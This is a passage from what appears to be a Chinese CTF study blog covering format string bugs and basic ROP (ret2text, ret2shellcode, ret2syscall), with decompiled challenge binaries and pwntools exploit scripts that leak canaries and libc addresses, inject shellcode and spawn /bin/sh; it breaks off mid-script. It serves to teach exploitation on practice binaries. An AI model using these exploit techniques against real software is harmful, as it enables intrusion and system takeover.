现在我们就可以得出漏洞原理：<strong>printf函数不会对格式化字符串漏洞中的占位符是否与所给参数的数目进行检查，执行时，它只会将占位符替换为其对应的地址里的内容，并输出。</strong></p><p><strong>常见的有格式化字符串函数有（来源CTF-Wiki）：</strong></p><ul><li>输入<ul><li>scanf</li></ul></li><li>输出</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">基本介绍</th></tr></thead><tbody><tr><td style="text-align:center">printf</td><td style="text-align:center">输出到 stdout</td></tr><tr><td style="text-align:center">fprintf</td><td style="text-align:center">输出到指定 FILE 流</td></tr><tr><td style="text-align:center">vprintf</td><td style="text-align:center">根据参数列表格式化输出到 stdout</td></tr><tr><td style="text-align:center">vfprintf</td><td style="text-align:center">根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td style="text-align:center">sprintf</td><td style="text-align:center">输出到字符串</td></tr><tr><td style="text-align:center">snprintf</td><td style="text-align:center">输出指定字节数到字符串</td></tr><tr><td style="text-align:center">vsprintf</td><td style="text-align:center">根据参数列表格式化输出到字符串</td></tr><tr><td style="text-align:center">vsnprintf</td><td style="text-align:center">根据参数列表格式化输出指定字节到字符串</td></tr><tr><td style="text-align:center">setproctitle</td><td style="text-align:center">设置 argv</td></tr><tr><td style="text-align:center">syslog</td><td style="text-align:center">输出日志</td></tr><tr><td style="text-align:center">err, verr, warn, vwarn 等</td><td style="text-align:center">。。。</td></tr></tbody></table></div><hr><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>​        格式化占位符，基本格式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C">%[parameter][flags][field width][.precision][length]type<br>    parameter：参数<br>flags：标志<br>field width：输出最小宽度<br>    precision：精度<br>    length：长度<br>    type：类型<br></code></pre></td></tr></table></figure><p>​        这里我们主要学习parameter和type，其余可参考<a href="[格式化字符串 - 维基百科，自由的百科全书 (wikipedia.org">格式化字符串</a><a href="https://zh.wikipedia.org/wiki/格式化字符串"></a>。</p><ul><li><p>parameter</p><p>| 字符  |                                              描述                                               |<br>| :—-: | :——————————————————————————————————————————————-: |<br>|  n$   | <em>n</em>是用这个格式说明符对指定参数做某些操作，如%5$n，向第五个位置写如前面已经打印出来的字符个数。 |</p></li></ul><ul><li><p>type</p><p>| 字符  |                                   意义                                   |<br>| :—-: | :———————————————————————————————————: |<br>|  %d   |                以十进制形式输出带符号整数(正数不输出符号)                |<br>|  %c   |                               输出单个字符                               |<br>|  %s   |                                输出字符串                                |<br>|  %p   |                    <code>void *</code>型，以地址（指针）形式输出                    |<br>|  %n   | 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量 |</p></li></ul><hr><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="一、覆盖任意地址内存"><a href="#一、覆盖任意地址内存" class="headerlink" title="一、覆盖任意地址内存"></a>一、覆盖任意地址内存</h3><p>​                <a href="https://files.buuoj.cn/files/ea8c23f0f475f7e4e0d8fdb5ccb58cef/pwn">[第五空间2019 决赛]PWN5</a></p><p>​                <strong>确定保护</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">RELRO           STACK CANARY      NX            PIE           RPATH      RUNPATH  SymbolsFORTIFYFortifiedFortifiable  FILE<br>Partial RELRO   Canary found      NX enabled    No PIE       No RPATH   No RUNPATH   No Symbols  No    <span class="hljs-number">0</span>     <span class="hljs-number">2</span>  pwn<br></code></pre></td></tr></table></figure><p>​                <strong>分析程序</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [esp+0h] [ebp-84h]</span><br>  <span class="hljs-type">char</span> nptr[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+4h] [ebp-80h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+14h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+78h] [ebp-Ch]</span><br>  <span class="hljs-type">int</span> *v7; <span class="hljs-comment">// [esp+7Ch] [ebp-8h]</span><br><br>  v7 = &amp;a1;<br>  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v1 = time(<span class="hljs-number">0</span>);<br>  srand(v1);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  read(fd, &amp;dword_804C044, <span class="hljs-number">4u</span>); <span class="hljs-comment">//向0x0804C044读入4个字节</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x63</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(buf);<span class="hljs-comment">//格式化字符串漏洞</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your passwd:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">0xF</span>u);<br>  <span class="hljs-keyword">if</span> ( atoi(nptr) == dword_804C044 )<span class="hljs-comment">//atoi()将字符串转为数字，如:将字符串&quot;10101010&quot;转为10101010</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok!!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fail&quot;</span>);<br>  &#125;<br>  result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( __readgsdword(<span class="hljs-number">0x14</span>u) != v6 )<br>    sub_80493D0();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>​        <strong>确定偏移量</strong></p><p><img src="https://pic.imgdb.cn/item/64316d830d2dde5777d7aafd.png" alt=""></p><p>​        <strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 攻击思路：第一次输入，利用格式化字符串漏洞将0x0804C044连续的四个地址覆盖为想要的数，第二次输出，输入我们刚刚覆盖的数，使之执行system函数执行。</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>payload = p32(<span class="hljs-number">0x0804C044</span>) + p32(<span class="hljs-number">0x0804C045</span>) + p32(<span class="hljs-number">0x0804C046</span>) + p32(<span class="hljs-number">0x0804C047</span>)<br>payload += <span class="hljs-string">b&#x27;%10$n&#x27;</span> + <span class="hljs-string">b&#x27;%11$n&#x27;</span> + <span class="hljs-string">b&#x27;%12$n&#x27;</span> + <span class="hljs-string">b&#x27;%13$n&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;your name:&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;your passwd:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10101010</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="二、泄露栈内存"><a href="#二、泄露栈内存" class="headerlink" title="二、泄露栈内存"></a>二、泄露栈内存</h3><p>​        <strong>2023 NKCTF baby_rop</strong></p><p>​        <strong>确定保护</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    SymbolsFORTIFYFortifiedFortifiableFILE<br>Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   <span class="hljs-number">74</span> Symbols  No    <span class="hljs-number">0</span>     <span class="hljs-number">3</span>      pwn<br></code></pre></td></tr></table></figure><p>​        <strong>分析程序</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>-----------------------------------------------------------------------------------------------------------------------------------------<br>__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format; <span class="hljs-comment">// [rsp+8h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> src[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+18h] [rbp-108h] BYREF</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">248</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-100h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+118h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-comment">//canary保护</span><br>  <span class="hljs-built_in">strcpy</span>(dest, <span class="hljs-string">&quot;Hello, &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to the NKCTF message board!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What is your name: &quot;</span>);<br>  my_read(src, <span class="hljs-number">8</span>);<br>  format = <span class="hljs-built_in">strcat</span>(dest, src);<br>  <span class="hljs-built_in">printf</span>(format); <span class="hljs-comment">//格式化字符串漏洞</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What are your comments and suggestions for the NKCTF: &quot;</span>);<br>  my_read(v4, <span class="hljs-number">0x100</span>);<span class="hljs-comment">//栈溢出，准确来说是栈迁移</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you, we will read your comments and suggestions carefully.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br>-----------------------------------------------------------------------------------------------------------------------------------------<br>    __int64 __fastcall <span class="hljs-title function_">my_read</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    v3 = read(<span class="hljs-number">0</span>, (i + a1), <span class="hljs-number">1uLL</span>);<br>    <span class="hljs-keyword">if</span> ( *(i + a1) == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  *(i + a1) = <span class="hljs-number">0</span>;<span class="hljs-comment">//执行完my_read之后 将rbp最后一个字节清零 如：rbp：0x7ffd1c9f2ce0 -&gt; rbp：0x7ffd1c9f2c00</span><br>  <span class="hljs-keyword">return</span> v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    <strong>栈迁移</strong></p><p><img src="https://pic.imgdb.cn/item/64322af90d2dde5777cd89d5.png" alt=""></p><p>​    两次leave_ret明显是栈迁移起手式</p><p>​    <strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 攻击思路：首先泄露canary值；然后，泄露libc地址；最后，构造rop链，拿到shell。</span><br><span class="hljs-comment"># libc database search:https://libc.blukat.me/</span><br><span class="hljs-comment"># 查找本机libc版本：strings /lib/x86_64-linux-gnu/libc.so.6 |grep version</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment"># context.log_level(value=&#x27;debug&#x27;)</span><br><br>p =process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-comment"># 泄露canary值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_canary</span>():<br>    <span class="hljs-built_in">format</span> = <span class="hljs-string">b&#x27;%41$p\n&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;name: &#x27;</span>,<span class="hljs-built_in">format</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>    log.info(<span class="hljs-built_in">hex</span>(canary))<br>    <span class="hljs-keyword">return</span> canary<br><br><span class="hljs-comment"># 泄露libc地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_base</span>():<br>    <span class="hljs-built_in">format</span> = <span class="hljs-string">b&#x27;%25$p\n&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;name: &#x27;</span>,<span class="hljs-built_in">format</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>    base = addr - <span class="hljs-number">0x001f7680</span><br>    <span class="hljs-keyword">return</span> base<br><br><br>ret_addr = <span class="hljs-number">0x0040101a</span><br>main_adr = <span class="hljs-number">0x004010F0</span><br>pop_rdi  = <span class="hljs-number">0x00401413</span><br>canary   = leak_canary()<br><br>debug()<br>payload = p64(ret_addr)*<span class="hljs-number">30</span> + p64(main_adr) + p64(canary)<br>p.sendafter(<span class="hljs-string">b&quot;the NKCTF: \n&quot;</span>, payload)<br><br>base   = get_base()<br>system = base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh  = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload = p64(ret_addr)*<span class="hljs-number">28</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(canary)<br>p.sendafter(<span class="hljs-string">b&quot;the NKCTF: \n&quot;</span>, payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本ROP</title>
    <link href="/2023/04/02/%E5%9F%BA%E6%9C%ACROP/"/>
    <url>/2023/04/02/%E5%9F%BA%E6%9C%ACROP/</url>
    
    <content type="html"><![CDATA[<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程</strong>。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ol><li><p>程序存在溢出，并且可以控制返回地址。</p></li><li><p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p></li></ol><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>文件:<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p><strong>查看一下程序的保护机制</strong><br><img src="" alt=""><br>可以看到这是开启了NX保护的32位程序</p><p><strong>ida查看代码</strong><br><img src="" alt=""></p><p>主程序中使用了gets函数，存在栈溢出。</p><p>在.text段发现<br><img src="" alt=""></p><p>得到地址0X0804863A，我们只需要把这个地址覆盖到会返回地址即可。</p><p><strong>求偏移</strong></p><p>利用cyclic 200生成200个垃圾数据<br><img src="" alt=""></p><p>运行输入后</p><p><img src="" alt=""><br><img src="" alt=""></p><p>偏移量为112</p><p><strong>exp</strong><br><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">io</span> = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br><br>address = p32(<span class="hljs-number">0x804863a</span>)<br>offset = <span class="hljs-number">112</span><br><br>payload = offset*b<span class="hljs-string">&#x27;a&#x27;</span> + address<br><br><span class="hljs-built_in">io</span>.sendline(payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><br>运行<br><img src="" alt=""></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</strong></p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>文件:<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p><strong>查看一下程序的保护机制</strong></p><p><img src="https://pic.imgdb.cn/item/63ec9656f144a01007c509ac.png" alt=""><br>没有任何保护</p><p>ida查看代码</p><p><img src="https://pic.imgdb.cn/item/63ec96c9f144a01007c61486.png" alt=""></p><p>gets函数可以溢出<br>然后看一下buf2的位置，看下是否可以执行，让我们插入shellcode<br><img src="https://pic.imgdb.cn/item/63ec9841f144a01007c9559a.png" alt=""><br><img src="https://pic.imgdb.cn/item/63ec9864f144a01007c9ac71.png" alt=""><br>具有可执行权限</p><p><strong>求偏移量</strong><br>利用cyclic 200生成200个垃圾数据<br><img src="" alt=""></p><p>运行输入后</p><p><img src="" alt=""><br><img src="" alt=""></p><p>偏移量为112</p><p><strong>那么本类型题目思路：</strong><br><strong>1.让gets函数溢出，返回到buf2的位置</strong><br><strong>2.插入shellcode</strong><br><strong>3.在buf2中执行，获取shell</strong></p><p><strong>exp</strong><br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>io = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br><span class="hljs-comment">#pwntools自动生成shellcode</span><br><span class="hljs-keyword">shellcode </span>= asm(<span class="hljs-keyword">shellcraft.sh())</span><br><span class="hljs-keyword"></span><span class="hljs-comment">#手写shellcode</span><br><span class="hljs-comment">#shellcode = asm(&quot;&quot;&quot;</span><br> <span class="hljs-comment">#           push 0x68</span><br>  <span class="hljs-comment">#          push 0x732f2f2f</span><br>   <span class="hljs-comment">#         push 0x6e69622f</span><br>    <span class="hljs-comment">#        mov ebx, esp</span><br>     <span class="hljs-comment">#       xor ecx, ecx</span><br>      <span class="hljs-comment">#      xor edx, edx</span><br>        <span class="hljs-comment">#    push 11</span><br>         <span class="hljs-comment">#   pop eax</span><br>          <span class="hljs-comment">#  int 0x80</span><br>           <span class="hljs-comment">#     &quot;&quot;&quot;)</span><br><span class="hljs-comment">#buf2的地址</span><br><span class="hljs-keyword">buf2_addr </span>= <span class="hljs-number">0x804a080</span><br>payload = <span class="hljs-keyword">shellcode.ljust(112, </span><span class="hljs-keyword">b&#x27;a&#x27;) </span>+ p32(<span class="hljs-keyword">buf2_addr)</span><br><span class="hljs-keyword"></span><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure></p><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，可直接突破NX保护，获取 shell。</p><h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><p>文件：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><p><strong>检测保护</strong><br><img src="https://pic.imgdb.cn/item/63ede4faf144a0100701c905.png" alt=""></p><p><strong>ida查看源码</strong><br><img src="https://pic.imgdb.cn/item/63ede589f144a01007028cbb.png" alt=""><br>依然是gets函数溢出</p><p>利用cyclic方法查到偏移量还是112</p><p><strong>接着利用系统调用来获取shell</strong><br><img src="https://pic.imgdb.cn/item/63ede698f144a01007043373.png" alt=""></p><p><strong>查找”pop eax; ret”</strong><br>命令：ROPgadget —binary ret2syscall —only “pop|ret” | grep “eax”<br><img src="https://pic.imgdb.cn/item/63ede7bdf144a0100706266d.png" alt=""></p><p><strong>查找”pop ebx, pop ecx, pop edx; ret”</strong><br>命令：ROPgadget —binary ret2syscall —only “pop|ret” | grep “ebx” | grep “ecx” | grep “edx”<br><img src="https://pic.imgdb.cn/item/63ede8bbf144a010070779dc.png" alt=""></p><p><strong>查找”/bin/sh”</strong><br>命令：ROPgadget —binary ret2syscall —string “/bin/sh”<br><img src="https://pic.imgdb.cn/item/63ede95cf144a0100708449b.png" alt=""></p><p><strong>查找”int 0x80”</strong><br>命令：ROPgadget —binary ret2syscall —only “int” | grep “0x80”<br><img src="https://pic.imgdb.cn/item/63edea55f144a010070a35cc.png" alt=""></p><p><strong>找到所有条件之后，构造exp</strong><br><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs erlang">from pwn import *<br><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch = <span class="hljs-string">&quot;i386&quot;</span>, os = <span class="hljs-string">&quot;linux&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">io</span> = <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">offset</span> = 112</span><br><span class="hljs-function"><span class="hljs-title">pop_eax</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x080bb196)</span></span><br><span class="hljs-function"><span class="hljs-title">pop_edx_ecx_ebx</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x0806eb90)</span></span><br><span class="hljs-function"><span class="hljs-title">bin_sh</span> = <span class="hljs-title">p32</span><span 